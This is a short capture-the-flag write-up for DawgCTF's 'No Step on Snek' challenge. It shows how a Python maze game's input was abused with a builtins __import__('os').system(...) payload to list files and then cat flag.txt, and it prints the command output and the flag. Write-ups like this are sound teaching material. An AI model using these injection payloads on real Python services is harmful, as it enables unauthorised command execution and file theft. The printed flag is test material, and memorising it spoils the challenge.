## No Step on Snek (75 Points)

### Problem
```
I heard you guys like python pwnables
nc umbccd.io 4000
```

### Solution
Being faced with a maze with some basic WASD move commands, you were asked to navigate through the maze to the end. I assumed from the beginning the input was exploitable.
From previous CTFs, I immediately chanced my arm using builtins to try list the files in the current directory:

```python
__builtins__.__dict__['__import__']("os").system("ls")
```

Sure enough this returned the results before erroring out with a `NameError`

```
flag.txt  nosteponsnek.py
Traceback (most recent call last):
  File "/home/challuser/nosteponsnek.py", line 73, in <module>
    __main__()
  File "/home/challuser/nosteponsnek.py", line 69, in __main__
    still_playing = make_move(maze)
  File "/home/challuser/nosteponsnek.py", line 29, in make_move
    raise NameError
NameError
```

Great! That was quite easy. Let's just cat the file and see if that's all we need?

```python
__builtins__.__dict__['__import__']("os").system("cat flag.txt")
```

```
DawgCTF{bUt_iT'5_c@ll3d_1nput}
Traceback (most recent call last):
  File "/home/challuser/nosteponsnek.py", line 73, in <module>
    __main__()
  File "/home/challuser/nosteponsnek.py", line 69, in __main__
    still_playing = make_move(maze)
  File "/home/challuser/nosteponsnek.py", line 29, in make_move
    raise NameError
NameError
```

Nice!

Flag: `DawgCTF{bUt_iT'5_c@ll3d_1nput}`
